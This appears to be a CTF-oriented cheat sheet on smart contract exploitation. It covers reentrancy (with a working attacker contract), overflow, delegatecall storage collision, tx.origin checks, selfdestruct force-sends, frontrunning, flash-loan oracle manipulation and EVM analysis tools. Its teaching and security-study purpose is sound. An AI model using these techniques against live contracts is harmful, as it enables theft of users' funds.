# Web3 and Smart Contract Exploitation

## Solidity Vulnerability Classes

### Reentrancy

**When**: A contract sends ETH before updating its state.

```solidity
// Vulnerable
function withdraw() public {
    uint amount = balances[msg.sender];
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] = 0;  // updated AFTER external call
}

// Attack: receive() calls withdraw() again before balance is zeroed
```

```solidity
// Attacker contract
contract Attack {
    Vulnerable target;
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();  // re-enter
        }
    }
    function attack() external payable {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}
```

### Integer Overflow/Underflow

Pre-Solidity 0.8: arithmetic wraps silently.

```solidity
// uint8 max = 255
uint8 x = 255;
x += 1;  // x = 0 (overflow, pre-0.8)

// Underflow
uint8 y = 0;
y -= 1;  // y = 255 (underflow, pre-0.8)

// Solidity 0.8+: reverts on overflow by default
// Bypass: unchecked { x += 1; }
```

### Delegatecall Storage Collision

**When**: `delegatecall` executes another contract's code in
the caller's storage context.

```solidity
// If contract A delegatecalls contract B:
// B's code runs, but reads/writes A's storage slots
// If storage layouts don't match: unintended state changes
// Attack: overwrite owner variable by writing to slot 0
```

### Access Control

```solidity
// tx.origin vs msg.sender
// tx.origin = original transaction sender (EOA)
// msg.sender = immediate caller (could be contract)
require(tx.origin == owner);  // VULNERABLE: phishing via intermediary contract
require(msg.sender == owner); // SAFE: only direct calls from owner
```

### Self-Destruct

```solidity
// Force-send ETH to a contract that doesn't expect it
selfdestruct(payable(targetAddress));
// Bypasses receive()/fallback() — directly credits balance
// Can break contracts that rely on address(this).balance
```

### Frontrunning / MEV

Transactions in the mempool are publicly visible. An attacker can:
- See a profitable transaction and submit one with higher gas first
- Sandwich attacks: buy before, sell after a large swap
- Copy solution submissions in CTF on-chain challenges

### Flash Loan Attacks

Borrow large amounts without collateral (repaid in same transaction):

```solidity
// 1. Borrow millions from Aave/dYdX
// 2. Manipulate price oracle
// 3. Exploit price-dependent logic
// 4. Repay loan
// All in one atomic transaction
```

## EVM Analysis

### Reading Contract Storage

```python
# Web3.py — read storage slots
from web3 import Web3
w3 = Web3(Web3.HTTPProvider(rpc_url))
value = w3.eth.get_storage_at(contract_address, slot_number)
# Slot 0: first state variable
# Slot 1: second state variable
# Mappings: keccak256(key . slot)
# Dynamic arrays: keccak256(slot) + index
```

### Decompiling Bytecode

```bash
# Get contract bytecode
cast code <address> --rpc-url <rpc>

# Decompile
panoramix <bytecode>                    # Panoramix decompiler
dedaub.com                              # online decompiler
ethervm.io/decompile/<address>          # online
```

### ABI Encoding

```python
# Encode function call
from eth_abi import encode
# function signature: first 4 bytes of keccak256("functionName(type1,type2)")
selector = Web3.keccak(text="transfer(address,uint256)")[:4]
data = selector + encode(['address', 'uint256'], [recipient, amount])
```

## Common CTF Patterns

| Challenge | Attack |
|---|---|
| Drain contract balance | Reentrancy |
| Become owner | Storage collision via delegatecall, access control flaw |
| Break invariant | Integer overflow, self-destruct force-send |
| Solve before others | Frontrun with higher gas, watch mempool |
| Manipulate price | Flash loan + oracle manipulation |
| Proxy upgrade | Overwrite implementation address via storage slot |

## Tools

```bash
foundry (forge, cast, anvil)           # Solidity dev framework
remix.ethereum.org                      # browser IDE
slither                                 # static analysis
mythril                                 # symbolic execution
echidna                                 # fuzzer
```
